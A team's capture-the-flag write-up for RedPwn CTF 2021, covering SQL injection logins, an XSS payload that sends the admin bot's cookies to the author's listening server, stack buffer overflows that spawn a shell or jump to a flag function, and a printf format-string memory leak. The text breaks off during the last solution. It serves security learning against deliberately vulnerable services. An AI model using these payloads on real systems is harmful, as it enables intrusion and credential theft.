# RedPwn CTF 2021 Challenge Writups

## Attempted/Solved Challenges

* web/inspect-me
* web/orm-bad
* web/secure
* web/pastebin-1
* rev/wstrings
* pwn/beginner-generic-pwn-number-0
* pwn/printf-please
* pwn/ret2generi-flag-reader

## Introductory Notes

RedPwnCTF2021 was a short 3 days Jeopardy Style online CTF hosted from 10th July, 2021 to 13th July, 2021. Our team
attempted a few problems in the short time and managed to solve all attempted problems. A detailed breakdown of our
approaches and additional notes we found out later from other writeups are included, along with the challenge files,
prompts and solution codes.

### web/orm-bad

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite

#### Author: TheRealDarkCoder

#### Prompt:>

```text
I just learned about orms today! They seem kinda difficult to implement though... Guess I'll stick to good old raw sql
statements!

orm-bad.mc.ax

Included Files: web/SOLVED_orm-bad/app.js
```

#### Overview

1. `secure.mc.ax` is a simple http(s) webserver. The source code is provided (`app.js`).

2. The website greets us with an authentication page. 

```html
<!DOCTYPE html>

<html lang="en">

<body>
    <div style="text-align:center">

        <h1>Sign in:</h1>
        <form id="login_form" action="/flag" method="POST">
            <label for="username">Username: </label><input type="text" name="username" id="username"><br>
            <label for="password">Password: </label><input type="password" name="password" id="username"><br>
            <input type="submit" name="submit" id="submit" value="Login">
        </form>
    </div>
</body>
```

1. The `app.js` file is analyzed and we find out the following important attack vector.

```js
app.post('/flag', (req, res) => {
            db.all("SELECT * FROM users WHERE username='" + req.body.username + "' AND password='" + req.body.password + "'", (err, rows) => {
                        try {
                            if (rows.length == 0) {
                                res.redirect("/?alert=" + encodeURIComponent("you are not admin :("));
                            } else if (rows[0].username === "admin") {
                                res.redirect("/?alert=" + encodeURIComponent(flag));
                            } else {
                                ...
```

4. The SQL Query is not sanitized and basic SQL Injection techniques are plausible. Our username has to be `admin`.

5. We pass in the following user inputs:
```
username=admin
password=1' or '1' = '1
```

Here the SQL Query would become 

```sql
"SELECT * FROM users WHERE username='admin' AND password='1' or '1' = '1'"
```

...resulting in a `True` output and giving us authentication to the user. And sure enough, we get an authenticated render of the page and get the flag.

6. A simple curl command can also show the redirect url and get the flag, make sure to url decode the string.

```sh
$ curl -d "username=admin&password=1' or '1'='1" -X POST https://orm-bad.mc.ax/flag

Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
#flag{sqli_overused_again_0b4f6}
```

##### Flag: flag{sqli_overused_again_0b4f6}

### web/secure

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite, Base64, Template Literals

#### Author: TheRealDarkCoder

#### Prompt:>

```
Just learned about encryption—now, my website is unhackable!

secure.mc.ax
```

#### Overview:>

1. Upon visiting the website, we get a similar authentication page as web/orm-bad. A source file is given (`web/SOLVED_secure/index.js`)

```html

  <div class="container">
    <h1>Sign In</h1>
    <form>
      <label for="username">Username</label>
      <input type="text" name="username" id="username" />
      <label for="password">Password</label>
      <input type="password" name="password" id="password" />
      <input type="submit" value="Submit" />
    </form>
    <div class="important"></div>
  </div>
  <script>
    (async() => {
      await new Promise((resolve) => window.addEventListener('load', resolve));
      document.querySelector('form').addEventListener('submit', (e) => {
        e.preventDefault();
        const form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('action', '/login');

        const username = document.createElement('input');
        username.setAttribute('name', 'username');
        username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );

        const password = document.createElement('input');
        password.setAttribute('name', 'password');
        password.setAttribute('value',
          btoa(document.querySelector('#password').value)
        );

        form.appendChild(username);
        form.appendChild(password);

        form.setAttribute('style', 'display: none');

        document.body.appendChild(form);
        form.submit();
      });
    })();

  
```

2. We first see an attack vector in database initiation

```javascript
const crypto = require('crypto');
const express = require('express');

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);`);
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```

We see that depreciated function `btoa()` is used.

3. In the front end client, we see the async function used to submit the form data. We see the snippet

```javascript
username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );
```

4. The POST data is also converted to base64 using btoa().

5. However, if we analyze the backend code even more, we see the login handling snippet

```javascript
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;
```
Here Javascript ES6 Template literals are used to pass in the user data (which is already base64 encoded from client side). But ES6 Template literals won't save one from SQL Injection. So all we have to do is keep the username a base64 encode of `admin` and the password an SQLI payload (`1' or '1'='1'`) like the previous challenge.

6. The following curl post request works just fine
```sh
$ curl -d "username=YWRtaW4=&password=1' or '1' = '1" -X POST https://secure.mc.ax/login

Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
```

##### Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}

### web/pastebin-1

---

#### Categeory: Web

#### Difficulty: Medium

#### Keywords: XSS, Cookie Hijacking

#### Author: TheRealDarkCoder

#### Prompt:>

```
Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

Admin bot: https://admin-bot.mc.ax/pastebin-1
```

#### Overview:>

1. As the prompt suggests, it is indeed a classic challenge. Upon visiting the website we find a input field which allows us to input any text, and then it stores the text somewhere and gives us a URL which we can use to view the text in the future, hence the name pastebin. The prompt also gives us a link to an admin bot page. The idea is that the admin bot also has a input field which takes the url of any pastebin link. Upon giving the link, the bot visits the link and reads the paste.

2. The backend is written in rust and provided to us (`web/SOLVED_pastebin-1/main.rs`). However I'm very rusty in rust (pun intended) so I decided not to bother with it, and instead try a classic XSS check. So I created a paste with the content 

```js
<script>alert(1)</script>
```

...and sure enough, we have XSS as an alert pops up.

3. On my remote server I open up a port using netcat

```sh
nc -lvpn 1337
```

... *The server is not behind a NAT as it's my test lab so it is publicly accesible. However I would not recommend using your own home computers instead use online services like [hookbin](https://hookbin.com) which gives you a free http endpoint (Thanks to [a writeup here](https://blog.pipeframe.xyz/post/redpwn2021))*
  
4. I create a simple cookie hijacking XSS script which takes the `document.cookie` and submits it as a get request parameter to my server

```html
<script>document.write('<img src="http://XX.XX.XX.XX:1337/?cookie=' + document.cookie + '" />')</script>
```

This XSS script will try to add a image to the DOM. The source of the image is a link to our attacker server where the `document.cookie` is sent along with a GET parameter in the URL. So when the browser (in this case the admin bot) tries to load in the image, it sends a GET request to the image source along with the cookie.

5. We create the paste and pass the link to the admin bot. The admin bot visits the link and we get the following http request at our server

```http
Connection from [REDACTED]:36854
GET /?cookie=flag=flag{d1dn7_n33d_70_b3_1n_ru57} HTTP/1.1
Host: [REDACTED]:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.148 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br

```

6. The cookie is the flag itself, no need to authenticate as admin.

##### Flag: flag{d1dn7_n33d_70_b3_1n_ru57}

### pwn/beginner-generic-pwn-number-0

---

#### Categeory: Binary Exploitation

#### Difficulty: Easy

#### Keywords: Buffer Overflow, Binary Exploitation

#### Author: TheRealDarkCoder

#### Prompt:> 

```
rob keeps making me write beginner pwn! i'll show him...

nc mc.ax 31199

```

#### Overview:>

1. We have a running service which we can connect to via netcat which is running a ELF binary. The compiled binary (`pwn/beginner-generic-pwn-number-0`) and the C source code (`beginner-generic-pwn-number-0.c`) is provided to us. Upon running the binary the file outputs 3 lines, the first being a random line each time (Taken from an array after an index is randomly generated) and then 2 hardcoded lines. Then the program asks for user input and exits after user input.

2. We take a look at the source code and immidietly find the attack vectors.

```c
...
char heartfelt_message[32];

...

gets(heartfelt_message);

if(inspirational_message_index == -1) {
   system("/bin/sh");
}
```

3. This is a classic buffer overflow challenge where depreciated `gets()` is used to take user input. There seems to be an impossible conditional check which makes a system call to open a shell for us. The value of `inspirational_message_index` has to be set to `-1` for the check to pass but the value is hardcoded to be between 0 and 2 above in the source code.

```c
const char *inspirational_messages[] = {
  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
};

int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  ...
```

4. We run the binary with `gdb` and take a look at the assembly code.

```asm
  ...
   0x0000000000401294 <+158>:	call   0x4010a0 <puts@plt>
   0x0000000000401299 <+163>:	lea    rax,[rbp-0x30]
   0x000000000040129d <+167>:	mov    rdi,rax
   0x00000000004012a0 <+170>:	call   0x4010f0 <gets@plt>
   0x00000000004012a5 <+175>:	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x00000000004012aa <+180>:	jne    0x4012b8 <main+194>
   0x00000000004012ac <+182>:	lea    rdi,[rip+0xf35]        # 0x4021e8
   0x00000000004012b3 <+189>:	call   0x4010c0 <system@plt>
   0x00000000004012b8 <+194>:	mov    eax,0x0
   0x00000000004012bd <+199>:	leave  
   0x00000000004012be <+200>:	ret
```

The above is a small ending part of `main` which we are interested in. We see that after the program outputs the 3 lines (`puts()`) the `main` calls a `gets()`. After which the pointer at `[rbp-0x8]` is compared with `0xffffffffffffffff` which is the hexadecimal of `-1`. So we can assume that `rbp-0x8` contains the address in stack which stores the random value generated at the top. If the check passes (Which naturally won't because `rand()` is hardcoding the value to be between 0 and 2) the binary runs a `system()` call to run a shell. So our target is to overflow the stack to replace the pointer stored at rbp-0x8 with `0xffffffffffffffff`.

5. We set a breakpoint just before the comparison at `0x00000000004012a5`.

```sh
break *0x00000000004012a5
```

Then we run the program with a test input `AABBCCDD` and reach the breakpoint and take a look at all the registers and some stack.

```asm
AABBCCDD

Breakpoint 1, 0x00000000004012a5 in main ()
(gdb) x/wx $rbp-0x8
0x7fffffffe368:	0x00000001
(gdb) x/24wx $rbp
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
0x7fffffffe3a0:	0x004012c0	0x00000000	0x55f78315	0x62ec878e
0x7fffffffe3b0:	0x00401110	0x00000000	0x00000000	0x00000000
0x7fffffffe3c0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/24wx $rsp
0x7fffffffe340:	0x42424141	0x44444343	0x00401200	0x00000000
0x7fffffffe350:	0x00000000	0x00000000	0x00401110	0x00000000
0x7fffffffe360:	0xffffe460	0x00007fff	0x00000001	0x00000000
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
```

We see that our user input is at `0x7fffffffe340` and the $rbp-0x8 is at `0x7fffffffe368`. Subtract the former from the later and we get `40`. So we need exactly `40` bytes of userinput to overflow the stack and reach the address where the value of `inspirational_message_index` is kept. We use python to provide the binary with 40 `A`s and recheck the stack.

```
0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0x00000000	0x00000000
```

And indeed we have reached out target.

6. Now we just need to fill the next 8 bytes with hexadecimals `ff`s.
I chose to use python2 here because python3 has some weird print directly as binary problems which I still don't understand. I'm sure it can be done with python3 with very simple syntax change but I did in Python2 anyway. 

```sh
r <<< $(python2 -c "print(b'A'*40 + b'\xff'*8)")
...
0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0xffffffff	0xffffffff
```

...and sure enough, our target addresses are now filled with `ff`s, which should allow the `jne` to pass and call the systemcall. `gdb` says 

```
(gdb) c
Continuing.
[Detaching after vfork from child process 12200]
[Inferior 1 (process 12156) exited normally]
```

...which means a system call has spawned in another process, in this case the shell. We try to run the python snippet on the actual binary 

```sh
(python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
```
*You have to wrap the line with parenthesis and then do this semicolon `cat` trick to get output from the shell. There are other cleaner ways to redirect the output from shell but this method works and is simple to remember.*

```
darkcoder:SOLVED_beginner-generic-pwn-number-0/ (pwn*) $ (python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
whoami
darkcoder
```

...and indeed we have a shell. Pass it to the remote server, run `ls; cat flag.txt` and the flag is ours.

##### Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}

### pwn/ret2generic-flag-reader

---

#### Categeory: Binary Exploit

#### Difficulty: Easy

#### Keywords: Buffer Overflow, Binary Exploit

#### Author: TheRealDarkCoder

#### Prompt:>

```
i'll ace this board meeting with my new original challenge!

nc mc.ax 31077
```

#### Overview:>

1. We have an ELF executable, the source code and a netcat port to connect to at a server. Running the binary prompts the following

```
❯ nc mc.ax 31077
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
AABBCCDD
```

2. Examining the source code, we find there are two functions, `main()` and `super_generic_flag_reading_function_please_ret_to_me()`. The second one looks like this
  
```c
void super_generic_flag_reading_function_please_ret_to_me()
{
  char flag[0x100] = {0};
  FILE *fp = fopen("./flag.txt", "r");
  if (!fp)
  {
    puts("no flag!! contact a member of rob inc");
    exit(-1);
  }
  fgets(flag, 0xff, fp);
  puts(flag);
  fclose(fp);
}
```

From my understanding, the function allocates 256 bytes (0x100 in hex) for the flag and fills it with 0s. It then uses `fopen()` to read a flag.txt file and `fgets()` the content into the allocated storage.

3. We take a look at the `main()` function

```c
int main(void)
{
  char comments_and_concerns[32];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
  puts("slap on some flavortext and there's no way rob will fire me now!");
  puts("this is genius!! what do you think?");

  gets(comments_and_concerns);
}
```

...again, `gets()` used to get user input, however nothing is done with the userinput. So obviously another buffer overflow.

4. The attack plan is simple. We need to overwrite some return pointers so that the `main()` function returns to call the `super_generic_flag_reading_function_please_ret_to_me()` function which prints the flag.

5. We create a demo `flag.txt` file and fill it with some "Z"s to simulate the server.

6. We run the given binary with `gdb` and disassemble the `main()` function first,

```asm
...

0x00000000004013e8 <+67>:    call   0x4010c0 <setbuf@plt>
   0x00000000004013ed <+72>:    lea    rdi,[rip+0xc4c]        # 0x402040
   0x00000000004013f4 <+79>:    call   0x4010a0 <puts@plt>
   0x00000000004013f9 <+84>:    lea    rdi,[rip+0xca0]        # 0x4020a0
   0x0000000000401400 <+91>:    call   0x4010a0 <puts@plt>
   0x0000000000401405 <+96>:    lea    rdi,[rip+0xd0c]        # 0x402118
   0x000000000040140c <+103>:   call   0x4010a0 <puts@plt>
   0x0000000000401411 <+108>:   lea    rdi,[rip+0xd48]        # 0x402160
   0x0000000000401418 <+115>:   call   0x4010a0 <puts@plt>
   0x000000000040141d <+120>:   lea    rax,[rbp-0x20]
   0x0000000000401421 <+124>:   mov    rdi,rax
   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt>
   0x0000000000401429 <+132>:   mov    eax,0x0
   0x000000000040142e <+137>:   leave
   0x000000000040142f <+138>:   ret
```

Nothing unusual, we spot the `puts()` and the `gets()` and then the program exits. We disassemble the other function too,

```asm
Dump of assembler code for function super_generic_flag_reading_function_please_ret_to_me:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x110
   0x0000000000401205 <+15>:    mov    QWORD PTR [rbp-0x110],0x0
   0x0000000000401210 <+26>:    mov    QWORD PTR [rbp-0x108],0x0
   0x000000000040121b <+37>:    mov    QWORD PTR [rbp-0x100],0x0
   ...

   0x0000000000401333 <+317>:   mov    QWORD PTR [rbp-0x18],0x0
   0x000000000040133b <+325>:   lea    rsi,[rip+0xcc6]        # 0x402008
   0x0000000000401342 <+332>:   lea    rdi,[rip+0xcc1]        # 0x40200a
   0x0000000000401349 <+339>:   call   0x4010f0 <fopen@plt>
   0x000000000040134e <+344>:   mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401352 <+348>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401357 <+353>:   jne    0x40136f <super_generic_flag_reading_function_please_ret_to_me+377>
   0x0000000000401359 <+355>:   lea    rdi,[rip+0xcb8]        # 0x402018
   0x0000000000401360 <+362>:   call   0x4010a0 <puts@plt>
   0x0000000000401365 <+367>:   mov    edi,0xffffffff
   0x000000000040136a <+372>:   call   0x401100 <exit@plt>
   0x000000000040136f <+377>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401373 <+381>:   lea    rax,[rbp-0x110]
   0x000000000040137a <+388>:   mov    esi,0xff
   0x000000000040137f <+393>:   mov    rdi,rax
   0x0000000000401382 <+396>:   call   0x4010d0 <fgets@plt>
   0x0000000000401387 <+401>:   lea    rax,[rbp-0x110]
   0x000000000040138e <+408>:   mov    rdi,rax
   0x0000000000401391 <+411>:   call   0x4010a0 <puts@plt>
   0x0000000000401396 <+416>:   mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040139a <+420>:   mov    rdi,rax
   0x000000000040139d <+423>:   call   0x4010b0 <fclose@plt>
   0x00000000004013a2 <+428>:   nop
   0x00000000004013a3 <+429>:   leave
   0x00000000004013a4 <+430>:   ret
End of assembler dump.
```

...Looks like the function starts at address `0x00000000004011f6`. So we need to return to `0x00000000004011f6` from `main()` somehow. 


7. We run the program normally and use python to print out a bunch of `A` until we get a segfault. In this case, 40 A's gave us a segmentation fault. We use `dmesg | tail` to figure out what's going on.
  
```
❯ python2 -c "print('A'*40)" | ./ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
[1]    19478 done                python2 -c "print('A'*40)" |
       19479 segmentation fault  ./ret2generic-flag-reader
 ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_ret2generic-flag-reader │ pwn ?1 ▓▒░────────░▒▓ 0|SEGV х │ 12:16:17 PM
❯ dmesg | tail
[328909.667233] ret2generic-fla[19857]: segfault at 7f848d7b14d0 ip 00007f848d7b14d0 sp 00007ffe88da9538 error 15
[328909.667236] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 <00> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

So we have a segfault at 7f848d7b14d0. Let's write 41 As and see what happens to that address.

```
[328992.779647] ret2generic-fla[19868]: segfault at 7fbe2f150041 ip 00007fbe2f150041 sp 00007fff48f61740 error 15 in libc-2.31.so[7fbe2f131000+25000]
```

Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too. 

8. So all we have to do, is replace `7fbe2f150041` in the dmesg with the address pointer of our flag printer function, and instead of a Segfault the `main()` will actually return there, because unlike `7fbe2f150041`, that address, specifically `0x00000000004011f6` (found from the disassembly) actually exists.


9. So we have to write 40A's or NoOps and then fill the next 6 bytes with `0000004011f6`

```py
python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')"
```

Due to endianness, we have to write the bytes upside down. Again I chose to go with python2 because of easier output as bytes. Pipe the output to our local binary,

```
❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | ./ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
ZZZZZZZZZZZZZZZZZZ

[1]    19503 done                python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" |
       19504 segmentation fault  ./ret2generic-flag-reader
```

...and boom we have our Z's. Now we pipe the output to the server,

```
❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | nc mc.ax 31077
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
```

and we have our flag.

##### Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}

### pwn/printf-please

---

#### Categeory: Binary Exploit

#### Difficulty: Medium

#### Keywords: Binary Exploit, Format String Exploit, printf

#### Author: TheRealDarkCoder

#### Prompt:>

```
Be sure to say please...

nc mc.ax 31569

```

#### Overview:>

1. We have a port to connect to, a ELF executable and a source code. Running the binary/connecting to the port prompts the following behaviour

```sh
❯ ./please
what do you say?
AABBCCDD
 ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 4s │ 12:29:09 PM
❯ ./please
what do you say?
please
please to you too!
 ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:29:12 PM
❯ ./please
what do you say?
please AABBCCDD
please AABBCCDD to you too!
```

So if we give any input after the keyword `please`, the program reflects it back to us.

2. We take a look at the source code, only one `main()` function,

```c
int main(void)
{
  char buffer[0x200];
  char flag[0x200];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  memset(buffer, 0, sizeof(buffer));
  memset(flag, 0, sizeof(flag));

  int fd = open("flag.txt", O_RDONLY);
  if (fd == -1) {
    puts("failed to read flag. please contact an admin if this is remote");
    exit(1);
  }

  read(fd, flag, sizeof(flag));
  close(fd);

  puts("what do you say?");

  read(0, buffer, sizeof(buffer) - 1);
  buffer[strcspn(buffer, "\n")] = 0;

  if (!strncmp(buffer, "please", 6)) {
    printf(buffer);
    puts(" to you too!");
  }
}
```

So the prgram sets a 512 bytes allocation for the buffer and 512 bytes for the flag (0x200 = 512). It then sets the buffer and flag with 0s. The program then opens a `flag.txt` and reads the file and puts the `flag` part of the memory.

The program then asks for useinput, this time using `strcspn()`, safer then `gets()` of course. So probably not a buffer overflow. But, if the userinput contains `please`, it `printf()`s the entire buffer, and there's the attack vector

```c
printf(buffer);
```

No format mentioned. So the program should be vulnerable to format string exploits. Let's try some common attacks.


```
❯ ./please
what do you say?
please %d
please 177207190 to you too!
 ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:34:05 PM
❯ ./please
what do you say?
please %p
please 0x7ffe1cfe98d6 to you too!
```

We have memory leaks.


3. We make a fake `flag.txt` file and fill it with `AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP`s to simulate the server. Then we write a python script which iterates through some numbers and try to print the i'th pointer in memory using this vulnerability. It is to be noted, we can take the xth address from memory using the format `please %x$p`. So if we want the 70th address we can input `please %70$p`\

```
❯ ./please
what do you say?
please %70$p
please 0x5a5a5a5a5a5a5a5a to you too!
```

We use pwntools in the python script

```python
from pwn import *

context.log_level = 'critical'

for i in range(0, 100):


    #s = remote('mc.ax', 31569)
    s = process('./please')

    s.recvline()
    s.sendline('please %' + str(i) + '$p')

    try:
        output = str(s.recv())
        print(str(i) + " > " + output)
    except:
      #s.close()
      s.shutdown()

    #s.close()
    s.shutdown()
```

We get this output

<details>
<summary>Output</summary>

```
❯ python3 ape.py
ape.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline('please %' + str(i) + '$p')
0 > b'please %0$p to you too!\n'
1 > b'please 0x7ffc98f47bf6 to you too!\n'
2 > b'please 0x1 to you too!\n'
3 > b'please (nil) to you too!\n'
4 > b'please 0x56304acf5010 to you too!\n'
5 > b'please 0x7f2c90bafd50 to you too!\n'
6 > b'please 0x2520657361656c70 to you too!\n'
7 > b'please 0x702437 to you too!\n'
8 > b'please (nil) to you too!\n'
9 > b'please (nil) to you too!\n'
10 > b'please (nil) to you too!\n'
11 > b'please (nil) to you too!\n'
12 > b'please (nil) to you too!\n'
13 > b'please (nil) to you too!\n'
14 > b'please (nil) to you too!\n'
15 > b'please (nil) to you too!\n'
16 > b'please (nil) to you too!\n'
17 > b'please (nil) to you too!\n'
18 > b'please (nil) to you too!\n'
19 > b'please (nil) to you too!\n'
20 > b'please (nil) to you too!\n'
21 > b'please (nil) to you too!\n'
22 > b'please (nil) to you too!\n'
23 > b'please (nil) to you too!\n'
24 > b'please (nil) to you too!\n'
25 > b'please (nil) to you too!\n'
26 > b'please (nil) to you too!\n'
27 > b'please (nil) to you too!\n'
28 > b'please (nil) to you too!\n'
29 > b'please (nil) to you too!\n'
30 > b'please (nil) to you too!\n'
31 > b'please (nil) to you too!\n'
32 > b'please (nil) to you too!\n'
33 > b'please (nil) to you too!\n'
34 > b'please (nil) to you too!\n'
35 > b'please (nil) to you too!\n'
36 > b'please (nil) to you too!\n'
37 > b'please (nil) to you too!\n'
38 > b'please (nil) to you too!\n'
39 > b'please (nil) to you too!\n'
40 > b'please (nil) to you too!\n'
41 > b'please (nil) to you too!\n'
42 > b'please (nil) to you too!\n'
43 > b'please (nil) to you too!\n'
44 > b'please (nil) to you too!\n'
45 > b'please (nil) to you too!\n'
46 > b'please (nil) to you too!\n'
47 > b'please (nil) to you too!\n'
48 > b'please (nil) to you too!\n'
49 > b'please (nil) to you too!\n'
50 > b'please (nil) to you too!\n'
51 > b'please (nil) to you too!\n'
52 > b'please (nil) to you too!\n'
53 > b'please (nil) to you too!\n'
54 > b'please (nil) to you too!\n'
55 > b'please (nil) to you too!\n'
56 > b'please (nil) to you too!\n'
57 > b'please (nil) to you too!\n'
58 > b'please (nil) to you too!\n'
59 > b'please (nil) to you too!\n'
60 > b'please (nil) to you too!\n'
61 > b'please (nil) to you too!\n'
62 > b'please (nil) to you too!\n'
63 > b'please (nil) to you too!\n'
64 > b'please (nil) to you too!\n'
65 > b'please (nil) to you too!\n'
66 > b'please (nil) to you too!\n'
67 > b'please (nil) to you too!\n'
68 > b'please (nil) to you too!\n'
69 > b'please (nil) to you too!\n'
70 > b'please 0x4444434342424141 to you too!\n'
71 > b'please 0x4848474746464545 to you too!\n'
72 > b'please 0x4c4c4b4b4a4a4949 to you too!\n'
73 > b'please 0x50504f4f4e4e4d4d to you too!\n'
74 > b'please (nil) to you too!\n'
75 > b'please (nil) to you too!\n'
76 > b'please (nil) to you too!\n'
77 > b'please (nil) to you too!\n'
78 > b'please (nil) to you too!\n'
79 > b'please (nil) to you too!\n'
80 > b'please (nil) to you too!\n'
81 > b'please (nil) to you too!\n'
82 > b'please (nil) to you too!\n'
83 > b'please (nil) to you too!\n'
84 > b'please (nil) to you too!\n'
85 > b'please (nil) to you too!\n'
86 > b'please (nil) to you too!\n'
87 > b'please (nil) to you too!\n'
88 > b'please (nil) to you too!\n'
89 > b'please (nil) to you too!\n'
90 > b'please (nil) to you too!\n'
91 > b'please (nil) to you too!\n'
92 > b'please (nil) to you too!\n'
93 > b'please (nil) to you too!\n'
94 > b'please (nil) to you too!\n'
95 > b'please (nil) to you too!\n'
96 > b'please (nil) to you too!\n'
97 > b'please (nil) to you too!\n'
98 > b'please (nil) to you too!\n'
99 > b'please (nil) to you too!\n'

```
</details>

If you observe carefully, you'll see that for i = 70 through 74, we get 0x4444434342424141, which is the hex of ASCII AABBCCDD, part of our flag. So we're pretty sure that's where our flag is. Let's write a python script to get those parts and attach them together. We also note that the bytes are reversed, probably endianness issue.

4. We modify the python script. The idea is
   1. We iterate 5 times to get the bytes for 70 to 75th pointers of the memory in the remote server.
